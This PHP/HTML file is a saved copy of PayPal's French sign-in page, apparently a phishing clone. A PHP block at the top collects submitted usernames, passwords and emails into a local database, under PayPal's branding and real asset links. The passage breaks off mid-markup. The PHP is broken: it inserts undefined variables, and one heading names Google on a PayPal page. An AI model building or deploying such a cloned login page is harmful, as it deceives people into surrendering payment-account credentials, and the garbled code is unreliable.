<?php // Ligne 1107 jusqu'a la fin se trouve le formulaire d'incription ?>



<?php

session_start();

include("config.php");

$message = '';

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
    $email = $_POST['email'];

    $sql = "INSERT INTO user (email, username, password) VALUES (:email, :username, :password)";
    $stmt = $pdo->prepare($sql);
    $result = $stmt->execute(['email' => $email, 'username' => $login_email, 'password' => $login_password]);

    if ($result) {
        $message = 'Inscription réussie!';
        header('Location: login.php');
    } else {
        $message = 'Erreur lors de l\'inscription.';
    }
}
?>


<!DOCTYPE html>
<!-- saved from url=(0029)https://www.paypal.com/signin -->
<html lang="fr" class=" desktop js ">
	<!--<![endif]-->
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<script crossorigin="anonymous" src="./Connectez-vous à votre compte PayPal_files/latmconf.js.téléchargement"></script><script async="" src="./Connectez-vous à votre compte PayPal_files/ngrlCaptcha.min.js.téléchargement"></script><!--Script info: script: node, template:  , date: Mar 14, 2024 07:15:40 -07:00, country: FR, language: fr web version:  content version:  hostname : rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLxna8cOY/pVz8EVlxDySXa4As11ln16d4 rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfaNDaGkY62kcWRUS7A5gfrDkELDUQbkPofO%2F6zbqQYaq_18e3d519399 -->
		<title>Connectez-vous à votre compte PayPal</title>
		<meta name="application-name" content="PayPal">
		<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<meta name="keywords" content="transfer money, email money transfer, international money transfer ">
		<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
		<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
		<link rel="canonical" href="https://www.paypal.com/fr/signin">
		<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
		<meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
		<link rel="stylesheet" href="./Connectez-vous à votre compte PayPal_files/contextualLoginElementalUIv4.css">
		<!--[if lte IE 9]>
		<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/774/0a1d2a02b9045b7105c75ed3a5b66/css/ie9.css" />
		<![endif]--><!-- build:js inline --><!-- build:[src] js/lib/ --><script nonce="" src="./Connectez-vous à votre compte PayPal_files/modernizr-2.6.1.js.téléchargement"></script><!-- /build --><!-- /build --><script nonce="">/* Special integration eligibility check */function isEligibleIntegration() {var sxf = "";return sxf === 'true' || window.name === 'PPFrameRedirect';}/* Don't bust the frame if this is top window */if (self === top || isEligibleIntegration()) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}</script>
		<style>/** method responsible for loading the background image set in CSS **/
			@-webkit-keyframes rotation {
			from {
			-webkit-transform: rotate(0deg);
			transform: rotate(0deg);
			}
			to {
			-webkit-transform: rotate(359deg);
			transform: rotate(359deg);
			}
			}
			@-moz-keyframes rotation {
			from {
			-moz-transform: rotate(0deg);
			transform: rotate(0deg);
			}
			to {
			-moz-transform: rotate(359deg);
			transform: rotate(359deg);
			}
			}
			@-o-keyframes rotation {
			from {
			-o-transform: rotate(0deg);
			transform: rotate(0deg);
			}
			to {
			-o-transform: rotate(359deg);
			transform: rotate(359deg);
			}
			}
			@keyframes rotation {
			from {
			transform: rotate(0deg);
			}
			to {
			transform: rotate(359deg);
			}
			}
			.country-selector .country {
			overflow: hidden;
			height: 24px;
			min-width: 32px;
			background: transparent url(https://www.paypalobjects.com/webstatic/mktg/icons/sprite_countries_flag4.png) 5px 100px no-repeat;
			border: none;
			text-align: left;
			}
			.country-selector ul li {
			list-style: none;
			width: 19%;
			display: inline-block;
			line-height: 1.5rem;
			min-height: 3em;
			}
			.country-selector ul li a.country {
			padding: 3px 10px 0 35px;
			overflow: visible;
			line-height: 1.2em;
			display: block;
			height: 30px;
			min-width: 30px;
			color: #777;
			font-weight: 400;
			font-size: 0.9375rem;
			}
			.country-selector .priorityCountries {
			border-bottom: 1px solid #cfcfcf;
			margin-bottom: 20px;
			}
			.country-selector .zambia,
			.country-selector .ZM {
			background-position: 5px 1px;
			}
			.country-selector .southafrica,
			.country-selector .ZA {
			background-position: 5px -34px;
			}
			.country-selector .YE,
			.country-selector .yemen {
			background-position: 5px -69px;
			}
			.country-selector .samoa,
			.country-selector .WS {
			background-position: 5px -104px;
			}
			.country-selector .vanuatu,
			.country-selector .VU {
			background-position: 5px -139px;
			}
			.country-selector .unitedstates,
			.country-selector .US {
			background-position: 5px -383px;
			}
			.country-selector .taiwan,
			.country-selector .TW {
			background-position: 5px -524px;
			}
			.country-selector .TR,
			.country-selector .turkey {
			background-position: 5px -629px;
			}
			.country-selector .TH,
			.country-selector .thailand {
			background-position: 5px -804px;
			}
			.country-selector .CH,
			.country-selector .switzerland {
			background-position: 5px -944px;
			}
			.country-selector .AR,
			.country-selector .argentina {
			background-position: 5px -6055px;
			}
			.country-selector .SK,
			.country-selector .slovakia {
			background-position: 5px -1224px;
			}
			.country-selector .SG,
			.country-selector .singapore {
			background-position: 5px -1294px;
			}
			.country-selector .SE,
			.country-selector .sweden {
			background-position: 5px -1329px;
			}
			.country-selector .portugal,
			.country-selector .PT {
			background-position: 5px -1679px;
			}
			.country-selector .PL,
			.country-selector .poland {
			background-position: 5px -1714px;
			}
			.country-selector .newzealand,
			.country-selector .NZ {
			background-position: 5px -1959px;
			}
			.country-selector .NO,
			.country-selector .norway {
			background-position: 5px -2099px;
			}
			.country-selector .netherlands,
			.country-selector .NL {
			background-position: 5px -2134px;
			}
			.country-selector .malaysia,
			.country-selector .MY {
			background-position: 5px -2379px;
			}
			.country-selector .mexico,
			.country-selector .MX {
			background-position: 5px -2414px;
			}
			.country-selector .martinique,
			.country-selector .MQ {
			background-position: 5px -4374px;
			}
			.country-selector .LU,
			.country-selector .luxembourg {
			background-position: 5px -2904px;
			}
			.country-selector .KR,
			.country-selector .southkorea {
			background-position: 5px -3254px;
			}
			.country-selector .japan,
			.country-selector .JP {
			background-position: 5px -3499px;
			}
			.country-selector .jamaica,
			.country-selector .JM {
			background-position: 5px -3569px;
			}
			.country-selector .IT,
			.country-selector .italy {
			background-position: 5px -3604px;
			}
			.country-selector .IL,
			.country-selector .israel {
			background-position: 5px -3709px;
			}
			.country-selector .IE,
			.country-selector .ireland {
			background-position: 5px -3744px;
			}
			.country-selector .ID,
			.country-selector .indonesia {
			background-position: 5px -3779px;
			}
			.country-selector .HU,
			.country-selector .hungary {
			background-position: 5px -3814px;
			}
			.country-selector .HK,
			.country-selector .hongkong {
			background-position: 5px -3919px;
			}
			.country-selector .GR,
			.country-selector .greece {
			background-position: 5px -4059px;
			}
			.country-selector .GB,
			.country-selector .unitedkingdom {
			background-position: 5px -4304px;
			}
			.country-selector .FR,
			.country-selector .france,
			.country-selector .frenchguiana,
			.country-selector .GF,
			.country-selector .GP,
			.country-selector .guadeloupe,
			.country-selector .RE,
			.country-selector .reunion {
			background-position: 5px -4374px;
			}
			.country-selector .FI,
			.country-selector .finland {
			background-position: 5px -4549px;
			}
			.country-selector .ES,
			.country-selector .spain {
			background-position: 5px -4618px;
			}
			.country-selector .EC,
			.country-selector .ecuador {
			background-position: 5px -4724px;
			}
			.country-selector .algeria,
			.country-selector .DZ {
			background-position: 5px -4759px;
			}
			.country-selector .denmark,
			.country-selector .DK {
			background-position: 5px -4864px;
			}
			.country-selector .DE,
			.country-selector .germany {
			background-position: 5px -4934px;
			}
			.country-selector .EG,
			.country-selector .egypt {
			background-position: 5px -69px;
			}
			.country-selector .CZ,
			.country-selector .czechrepublic {
			background-position: 5px -4969px;
			}
			.country-selector .C2,
			.country-selector .china,
			.country-selector .CN {
			background-position: 5px -5144px;
			}
			.country-selector .CA,
			.country-selector .canada {
			background-position: 5px -5319px;
			}
			.country-selector .botswana,
			.country-selector .BW {
			background-position: 5px -5389px;
			}
			.country-selector .belize,
			.country-selector .BZ {
			background-position: 5px -5354px;
			}
			.country-selector .bahamas,
			.country-selector .BS {
			background-position: 5px -5459px;
			}
			.country-selector .BR,
			.country-selector .brazil {
			background-position: 5px -5494px;
			}
			.country-selector .bermuda,
			.country-selector .BM {
			background-position: 5px -5599px;
			}
			.country-selector .bahrain,
			.country-selector .BH {
			background-position: 5px -5704px;
			}
			.country-selector .BE,
			.country-selector .belgium {
			background-position: 5px -5809px;
			}
			.country-selector .barbados,
			.country-selector .BB {
			background-position: 5px -5844px;
			}
			.country-selector .BA,
			.country-selector .bosniaandherzegovina {
			background-position: 5px -5879px;
			}
			.country-selector .BF,
			.country-selector .burkinafaso {
			background-position: 5px -5773px;
			}
			.country-selector .AU,
			.country-selector .australia {
			background-position: 5px -5984px;
			}
			.country-selector .AT,
			.country-selector .austria {
			background-position: 5px -6019px;
			}
			.country-selector .AL,
			.country-selector .albania {
			background-position: 5px -6194px;
			}
			.country-selector .AG,
			.country-selector .antiguaandbarbuda {
			background-position: 5px -6264px;
			}
			.country-selector .AD,
			.country-selector .andorra {
			background-position: 5px -6334px;
			}
			.country-selector .BG,
			.country-selector .bulgaria {
			background-position: 5px -5739px;
			}
			.country-selector .cambodia,
			.country-selector .KH {
			background-position: 5px -3397px;
			}
			.country-selector .caymanislands,
			.country-selector .KY {
			background-position: 5px -4479px;
			}
			.country-selector .CO,
			.country-selector .colombia {
			background-position: 5px -5109px;
			}
			.country-selector .croatia,
			.country-selector .HR {
			background-position: 5px -3849px;
			}
			.country-selector .CY,
			.country-selector .cyprus {
			background-position: 5px -5004px;
			}
			.country-selector .DM,
			.country-selector .dominica {
			background-position: 5px -4829px;
			}
			.country-selector .DO,
			.country-selector .dominicanrepublic {
			background-position: 5px -4794px;
			}
			.country-selector .elsalvador,
			.country-selector .SV {
			background-position: 5px -979px;
			}
			.country-selector .ER,
			.country-selector .eritrea {
			background-position: 5px -4655px;
			}
			.country-selector .EE,
			.country-selector .estonia {
			background-position: 5px -4689px;
			}
			.country-selector .ET,
			.country-selector .ethiopia {
			background-position: 5px -4587px;
			}
			.country-selector .faroeislands,
			.country-selector .FO {
			background-position: 5px -4409px;
			}
			.country-selector .fiji,
			.country-selector .FJ {
			background-position: 5px -4514px;
			}
			.country-selector .frenchpolynesia,
			.country-selector .PF {
			background-position: 5px -1819px;
			}
			.country-selector .GI,
			.country-selector .gibraltar {
			background-position: 5px -4199px;
			}
			.country-selector .GL,
			.country-selector .greenland {
			background-position: 5px -4164px;
			}
			.country-selector .GD,
			.country-selector .grenada {
			background-position: 5px -4269px;
			}
			.country-selector .GT,
			.country-selector .guatemala {
			background-position: 5px -4024px;
			}
			.country-selector .HN,
			.country-selector .honduras {
			background-position: 5px -3884px;
			}
			.country-selector .iceland,
			.country-selector .IS {
			background-position: 5px -3639px;
			}
			.country-selector .JO,
			.country-selector .jordan {
			background-position: 5px -3534px;
			}
			.country-selector .KE,
			.country-selector .kenya {
			background-position: 5px -3464px;
			}
			.country-selector .kuwait,
			.country-selector .KW {
			background-position: 5px -3219px;
			}
			.country-selector .latvia,
			.country-selector .LV {
			background-position: 5px -2869px;
			}
			.country-selector .lesotho,
			.country-selector .LS {
			background-position: 5px -2974px;
			}
			.country-selector .LI,
			.country-selector .liechtenstein {
			background-position: 5px -3044px;
			}
			.country-selector .lithuania,
			.country-selector .LT {
			background-position: 5px -2939px;
			}
			.country-selector .malawi,
			.country-selector .MW {
			background-position: 5px -2449px;
			}
			.country-selector .malta,
			.country-selector .MT {
			background-position: 5px -2554px;
			}
			.country-selector .MN,
			.country-selector .mongolia {
			background-position: 5px -6369px;
			}
			.country-selector .MA,
			.country-selector .morocco {
			background-position: 5px -2834px;
			}
			.country-selector .mozambique,
			.country-selector .MZ {
			background-position: 5px -2344px;
			}
			.country-selector .NC,
			.country-selector .newcaledonia {
			background-position: 5px -2274px;
			}
			.country-selector .OM,
			.country-selector .oman {
			background-position: 5px -1924px;
			}
			.country-selector .palau,
			.country-selector .PW {
			background-position: 5px -1644px;
			}
			.country-selector .PA,
			.country-selector .panama {
			background-position: 5px -1889px;
			}
			.country-selector .PH,
			.country-selector .philippines {
			background-position: 5px -1749px;
			}
			.country-selector .pitcairnislands,
			.country-selector .PN {
			background-position: 5px -6229px;
			}
			.country-selector .QA,
			.country-selector .qatar {
			background-position: 5px -5704px;
			}
			.country-selector .RO,
			.country-selector .romania {
			background-position: 5px -1539px;
			}
			.country-selector .RU,
			.country-selector .russia {
			background-position: 5px -1503px;
			}
			.country-selector .RW,
			.country-selector .rwanda {
			background-position: 5px -6439px;
			}
			.country-selector .saotomeandprincipe,
			.country-selector .ST {
			background-position: 5px -1014px;
			}
			.country-selector .KN,
			.country-selector .saintkittsandnevis {
			background-position: 5px -3289px;
			}
			.country-selector .sainthelena,
			.country-selector .SH {
			background-position: 5px -909px;
			}
			.country-selector .saintvincentandthegrenadines,
			.country-selector .VC {
			background-position: 5px -278px;
			}
			.country-selector .LC,
			.country-selector .saintlucia {
			background-position: 5px -3079px;
			}
			.country-selector .PM,
			.country-selector .saintpierreandmiquelon {
			background-position: 5px -6824px;
			}
			.country-selector .sanmarino,
			.country-selector .SM {
			background-position: 5px -1154px;
			}
			.country-selector .SA,
			.country-selector .saudiarabia {
			background-position: 5px -1434px;
			}
			.country-selector .SC,
			.country-selector .seychelles {
			background-position: 5px -1364px;
			}
			.country-selector .SI,
			.country-selector .slovenia {
			background-position: 5px -1259px;
			}
			.country-selector .tajikistan,
			.country-selector .TJ {
			background-position: 5px -769px;
			}
			.country-selector .trinidadandtobago,
			.country-selector .TT {
			background-position: 5px -594px;
			}
			.country-selector .AE,
			.country-selector .unitedarabemirates {
			background-position: 5px -6299px;
			}
			.country-selector .uruguay,
			.country-selector .UY {
			background-position: 5px -351px;
			}
			.country-selector .VE,
			.country-selector .venezuela {
			background-position: 5px -244px;
			}
			.country-selector .IN,
			.country-selector .india {
			background-position: 5px -3674px;
			}
			.country-selector .vietnam,
			.country-selector .VN {
			background-position: 5px -174px;
			}
			.country-selector .angola,
			.country-selector .AO {
			background-position: 5px -6089px;
			}
			.country-selector .AI,
			.country-selector .anguilla {
			background-position: 5px -6229px;
			}
			.country-selector .AM,
			.country-selector .armenia {
			background-position: 5px -6159px;
			}
			.country-selector .aruba,
			.country-selector .AW {
			background-position: 5px -5949px;
			}
			.country-selector .AZ,
			.country-selector .azerbaijanrepublic {
			background-position: 5px -5914px;
			}
			.country-selector .benin,
			.country-selector .BJ {
			background-position: 5px -5634px;
			}
			.country-selector .bhutan,
			.country-selector .BT {
			background-position: 5px -5424px;
			}
			.country-selector .BO,
			.country-selector .bolivia {
			background-position: 5px -5529px;
			}
			.country-selector .BN,
			.country-selector .brunei {
			background-position: 5px -5564px;
			}
			.country-selector .BI,
			.country-selector .burundi {
			background-position: 5px -5669px;
			}
			.country-selector .capeverde,
			.country-selector .CV {
			background-position: 5px -5039px;
			}
			.country-selector .chad,
			.country-selector .TD {
			background-position: 5px -1539px;
			}
			.country-selector .chile,
			.country-selector .CL {
			background-position: 5px -5179px;
			}
			.country-selector .comoros,
			.country-selector .KM {
			background-position: 5px -3324px;
			}
			.country-selector .CK,
			.country-selector .cookislands {
			background-position: 5px -5214px;
			}
			.country-selector .costarica,
			.country-selector .CR {
			background-position: 5px -5074px;
			}
			.country-selector .CD,
			.country-selector .democraticrepublicofthecongo {
			background-position: 5px -5284px;
			}
			.country-selector .DJ,
			.country-selector .djibouti {
			background-position: 5px -4899px;
			}
			.country-selector .falklandislands,
			.country-selector .FK {
			background-position: 5px -6229px;
			}
			.country-selector .GA,
			.country-selector .gabonrepublic {
			background-position: 5px -4339px;
			}
			.country-selector .gambia,
			.country-selector .GM {
			background-position: 5px -4129px;
			}
			.country-selector .GE,
			.country-selector .georgia {
			background-position: 5px -6652px;
			}
			.country-selector .GN,
			.country-selector .guinea,
			.country-selector .guineabissau,
			.country-selector .GW {
			background-position: 5px -3989px;
			}
			.country-selector .guyana,
			.country-selector .GY {
			background-position: 5px -3954px;
			}
			.country-selector .kazakhstan,
			.country-selector .KZ {
			background-position: 5px -3149px;
			}
			.country-selector .KI,
			.country-selector .kiribati {
			background-position: 5px -3359px;
			}
			.country-selector .KG,
			.country-selector .kyrgyzstan {
			background-position: 5px -3429px;
			}
			.country-selector .LA,
			.country-selector .laos {
			background-position: 5px -3114px;
			}
			.country-selector .madagascar,
			.country-selector .MG {
			background-position: 5px -2799px;
			}
			.country-selector .maldives,
			.country-selector .MV {
			background-position: 5px -2484px;
			}
			.country-selector .mali,
			.country-selector .ML {
			background-position: 5px -2729px;
			}
			.country-selector .marshallislands,
			.country-selector .MH {
			background-position: 5px -2764px;
			}
			.country-selector .mauritania,
			.country-selector .MR {
			background-position: 5px -2624px;
			}
			.country-selector .mauritius,
			.country-selector .MU {
			background-position: 5px -2519px;
			}
			.country-selector .FM,
			.country-selector .micronesia {
			background-position: 5px -4444px;
			}
			.country-selector .montserrat,
			.country-selector .MS {
			background-position: 5px -2589px;
			}
			.country-selector .mayotte,
			.country-selector .YT {
			background-position: 5px -4374px;
			}
			.country-selector .NA,
			.country-selector .namibia {
			background-position: 5px -2309px;
			}
			.country-selector .nauru,
			.country-selector .NR {
			background-position: 5px -2029px;
			}
			.country-selector .nepal,
			.country-selector .NP {
			background-position: 5px -2064px;
			}
			.country-selector .AN,
			.country-selector .netherlandsantilles {
			background-position: 5px -6124px;
			}
			.country-selector .NI,
			.country-selector .nicaragua {
			background-position: 5px -2169px;
			}
			.country-selector .NE,
			.country-selector .niger {
			background-position: 5px -2239px;
			}
			.country-selector .niue,
			.country-selector .NU {
			background-position: 5px -1994px;
			}
			.country-selector .NF,
			.country-selector .norfolkisland {
			background-position: 5px -2204px;
			}
			.country-selector .papuanewguinea,
			.country-selector .PG {
			background-position: 5px -1784px;
			}
			.country-selector .PE,
			.country-selector .peru {
			background-position: 5px -1854px;
			}
			.country-selector .CG,
			.country-selector .republicofcongo {
			background-position: 5px -5284px;
			}
			.country-selector .senegal,
			.country-selector .SN {
			background-position: 5px -1119px;
			}
			.country-selector .RS,
			.country-selector .serbia {
			background-position: 5px -6718px;
			}
			.country-selector .sierraleone,
			.country-selector .SL {
			background-position: 5px -1189px;
			}
			.country-selector .SB,
			.country-selector .solomonislands {
			background-position: 5px -1399px;
			}
			.country-selector .SO,
			.country-selector .somalia {
			background-position: 5px -1084px;
			}
			.country-selector .LK,
			.country-selector .srilanka {
			background-position: 5px -3009px;
			}
			.country-selector .SH,
			.country-selector .sthelena {
			background-position: 5px -909px;
			}
			.country-selector .SR,
			.country-selector .suriname {
			background-position: 5px -1049px;
			}
			.country-selector .swaziland,
			.country-selector .SZ {
			background-position: 5px -6509px;
			}
			.country-selector .SJ,
			.country-selector .svalbardandjanmayen {
			background-position: 5px -2099px;
			}
			.country-selector .tanzania,
			.country-selector .TZ {
			background-position: 5px -489px;
			}
			.country-selector .TG,
			.country-selector .togo {
			background-position: 5px -839px;
			}
			.country-selector .TO,
			.country-selector .tonga {
			background-position: 5px -664px;
			}
			.country-selector .TN,
			.country-selector .tunisia {
			background-position: 5px -699px;
			}
			.country-selector .TM,
			.country-selector .turkmenistan {
			background-position: 5px -734px;
			}
			.country-selector .TC,
			.country-selector .turksandcaicos {
			background-position: 5px -909px;
			}
			.country-selector .tuvalu,
			.country-selector .TV {
			background-position: 5px -559px;
			}
			.country-selector .UG,
			.country-selector .uganda {
			background-position: 5px -419px;
			}
			.country-selector .UA,
			.country-selector .ukraine {
			background-position: 5px -454px;
			}
			.country-selector .VA,
			.country-selector .vaticancity {
			background-position: 5px -314px;
			}
			.country-selector .VG,
			.country-selector .virginislands {
			background-position: 5px -209px;
			}
			.country-selector .wallisandfutuna,
			.country-selector .WF {
			background-position: 5px -6792px;
			}
			.country-selector .ME,
			.country-selector .montenegro {
			background-position: 5px -6859px;
			}
			.country-selector .macedonia,
			.country-selector .MK {
			background-position: 5px -6894px;
			}
			.country-selector .MD,
			.country-selector .moldova {
			background-position: 5px -6929px;
			}
			.country-selector .kosovo,
			.country-selector .XK {
			background-position: 5px -6964px;
			}
			.country-selector .belarus,
			.country-selector .BY {
			background-position: 5px -6999px;
			}
			.country-selector .MC,
			.country-selector .monaco {
			background-position: 5px -7034px;
			}
			.country-selector .NG,
			.country-selector .nigeria {
			background-position: 5px -7069px;
			}
			.country-selector .GH,
			.country-selector .ghana {
			background-position: 5px -7104px;
			}
			.country-selector .CI,
			.country-selector .cotedivoire {
			background-position: 5px -7139px;
			}
			.country-selector .cameroon,
			.country-selector .CM {
			background-position: 5px -7174px;
			}
			.country-selector .zimbabwe,
			.country-selector .ZW {
			background-position: 5px -7209px;
			}
			.country-selector .paraguay,
			.country-selector .PY {
			background-position: 5px -7244px;
			}
			@media all and (max-width: 767px) {
			.country-selector ul li {
			display: block;
			width: 100%;
			}
			.priorityCountries span::before {
			font-size: 3em;
			float: right;
			padding-right: 10px;
			}
			}
			ul.priorityCountries li:first-child a:visited,
			ul.priorityCountries li:first-child a:hover {
			text-decoration: none;
			}
			@media all and (min-width: 768px) {
			.priorityCountries span::before {
			content: none;
			}
			}
			.countryListModal {
			position: absolute;
			top: 100%;
			transition: all 0.3s ease-out;
			min-height: 100vh;
			min-width: 100vw;
			background: #fff;
			z-index: 999999;
			opacity: 1;
			}
			.countryListModal.transitionUp {
			top: 0;
			}
			.countryListModal .wrapper {
			margin: 0 auto;
			width: 70%;
			}
			@media all and (max-width: 767px) {
			.countryListModal .wrapper {
			width: 100%;
			}
			}
			.countryListModal .buttonHolder {
			min-height: 7rem;
			position: fixed;
			width: 70%;
			}
			.countryListModal .ghostElement {
			/* hides behind fixed button holder */
			height: 7rem;
			}
			.countryListModal .modalContent {
			padding-left: 10px;
			}
			@media all and (max-width: 767px) {
			.countryListModal .buttonHolder {
			min-height: 5rem;
			width: 100%;
			}
			.countryListModal .ghostElement {
			height: 5rem;
			}
			.countryListModal .closeModal::before {
			/* to align with the selector icon */
			padding-right: 20px;
			}
			}
			.countryListModal .closeModal {
			background: none;
			border: none;
			padding: 0 4px 0;
			float: right;
			color: #2c2e2f;
			cursor: pointer;
			height: 40px;
			font-size: 2em;
			}
			.countryListModal .paypalIcon {
			background: url(https://www.paypalobjects.com/webstatic/i/consumer/onboarding/icon_PP_monogram_2x.png) center 14px no-repeat #fff;
			background-size: 20px;
			}
			.picker.country-selector {
			display: inline-block;
			vertical-align: middle;
			position: relative;
			}
			.picker.country-selector button {
			display: inline-block;
			margin-right: 30px;
			cursor: pointer;
			}
			.picker.country-selector button::after {
			content: '';
			position: absolute;
			bottom: 10px;
			height: 8px;
			width: 8px;
			left: 30px;
			margin: 8px 0 0 8px;
			border-color: #333;
			border-image: none;
			border-style: solid;
			border-width: 1px 1px 0 0;
			-webkit-transform: rotate(135deg);
			-moz-transform: rotate(135deg);
			-o-transform: rotate(135deg);
			-ms-transform: rotate(135deg);
			transform: rotate(135deg);
			}
		</style>
		<style nonce="">@font-face { font-family: "PayPalSansBig-Regular"; font-style: normal; font-display: swap; src: url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.woff2') format('woff2'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.woff') format('woff'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.eot?#iefix') format('embedded-opentype'), url('https://www.paypalobjects.com/paypal-ui/fonts/PayPalSansBig-Regular.svg') format('svg'); } #gdprCookieBanner { font-family: PayPalSansBig-Regular, sans-serif; } @keyframes slideInFromBottom { 0% { transform: translateY(100%); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } } #gdprCookieBanner.gdprCookieBanner_container { box-sizing: border-box; animation: 1s ease-in 0s 1 slideInFromBottom; max-width: 84%; position: fixed; top: auto; bottom: 2rem; left: 0; right: 0; margin: 0 auto; background-color: #FFFFFF; z-index: 1051; display: flex; align-items: center; justify-content: space-between; box-shadow: 0px 12px 28px rgb(0 0 0 / 16%); border-radius: 12px; padding: 1rem 5rem; } #gdprCookieBanner.gdprCookieBanner_container * { box-sizing: border-box; } #gdprCookieBanner.gdprCookieBanner_rtl { direction: rtl; } #gdprCookieBanner .gdprCookieBanner_content { color: #000000; font-family: 'PayPalSansBig-Regular'; font-size: 14px; line-height: 20px; margin: 0; padding: 0; } #gdprCookieBanner .gdprCookieBanner_content a { text-decoration: underline; color: #0070ba; font-family: PayPalSansBig-Regular; font-weight: 500; } #gdprCookieBanner .gdprCookieBanner_buttonGroup { display: flex; flex-direction: column; } #gdprCookieBanner .gdprCookieBanner_content a:focus, #gdprCookieBanner .gdprCookieBanner_buttonGroup button:focus { border: 1px solid #0070BA; } #gdprCookieBanner button.gdprCookieBanner_button { font-size: 14px; line-height: 24px; font-weight: 600; color: #0070BA; background: #FFFFFF; border: 1px solid #0070BA; border-radius: 24px; min-width: 6rem; min-height: 2rem; cursor: pointer; padding: 0px 1.5rem; } #gdprCookieBanner .gdprCookieBanner_content-separator { margin: 0 2rem; } #gdprCookieBanner .gdprCookieBanner_button-separator { margin: 0.25rem 0rem; } .gdprCookieBanner-acceptedAll { height: auto; padding-bottom: 8em; } @media only screen and (max-width: 768px) { #gdprCookieBanner.gdprCookieBanner_container{ max-width: 92%; flex-direction: column; bottom: 1rem; padding: 0.75rem 1.25rem; } #gdprCookieBanner .gdprCookieBanner_content-separator { margin: 0.375rem 0; } #gdprCookieBanner .gdprCookieBanner_button-separator { margin: 0 0.625rem; } #gdprCookieBanner .gdprCookieBanner_buttonGroup { justify-content: center; flex-direction: row-reverse; } #gdprCookieBanner button.gdprCookieBanner_button { min-width: 8.375rem; } } @media only screen and (max-width: 600px) { .gdprCookieBanner-acceptedAll { height: auto; padding-bottom: 12em; } } @media only screen and (max-width: 575.98px) { #gdprCookieBanner .gdprHideCookieBannerMobile { display:none; } }</style>
	</head>
	<body class="desktop gdprCookieBanner-acceptedAll" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfaNDaGkY62kcWRUS7A5gfrDkELDUQbkPofO%2F6zbqQYaq_18e3d519399" data-hostname="rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLxna8cOY/pVz8EVlxDySXa4As11ln16d4" data-production="true" data-enable-ads-captcha="true" data-disable-ads-challenge="true" data-ads-challenge-url="/auth/createchallenge/c9710c71c3750ac1/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="f8121184d7133" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-phone-code="FR +33" data-csrf-token="yCh7VtraV7PiifYOFPSXdJEzbYoiz4nYjoeEA=" data-nonce="VcEYSSvZLAji6WF+kfdmeqsS91SXPy2mX84Ktjn2Ne1FDEbu" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true" data-show-country-drop-down="true" data-email-label="Email" data-xhr-timeout-limit="20000" data-load-start-time="1710425740185" data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10" style="margin-bottom: 104px;">
		<noscript>
			<p class="nonjsAlert" role="alert">Remarque : plusieurs fonctions du site PayPal requièrent l'activation de JavaScript et des cookies.</p>
		</noscript>
		<div id="main" class="main" role="main">
			<section id="slLanding" class="slLanding hide" data-role="page" data-title="Connectez-vous à votre compte Google et payez plus rapidement sur vos appareils.">
				<div class="corral">
					<div id="slContent" class="contentContainer contentContainerBordered">
						<header>
							<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p>
						</header>
						<div id="linked" class="linked ">
							<div class="profileRemembered"><span class="loginEmail"></span><a href="https://www.paypal.com/signin#" class="changeLink scTrack:not-you" id="changeLink" pa-marked="1">Modifier</a></div>
							<div class="headerTextDecorated"></div>
							<h1 class="headerText">Rester connecté pour des paiements plus rapides</h1>
							<p class="description assure">Activez la connexion automatique sur ce navigateur et accélérez chaque paiement. (Non recommandé sur les appareils partagés.)<span class="learnMoreLink"><a href="https://www.paypal.com/signin#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">Qu'est-ce que c'est&nbsp;?</a></span></p>
							<div id="partnerProfile" class="partnerProfile">
								<div id="partnerPhoto" class="partnerPhoto" style="background-image: url(&#39;&#39;)"></div>
								<div class="partnerDetails">
									<span>Vous êtes connecté en tant que</span>
									<div id="displayName" class="displayName"></div>
									<div>
										<div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail" class="partnerEmail"></span><span id="partnerEmailDomain"></span></div>
									</div>
								</div>
							</div>
							<div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn" pa-marked="1">Continuer</button></div>
							<div id="secondaryLogin" class="buttonAsLink secondaryLink"><button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn" pa-marked="1">Utiliser le mot de passe</button></div>
						</div>
						<div id="unlinked" class="unlinked ">
							<div id="headerIcon" class="partnerConnect"></div>
							<h1 class="headerText">Connectez-vous à votre compte Google et payez plus rapidement sur vos appareils.</h1>
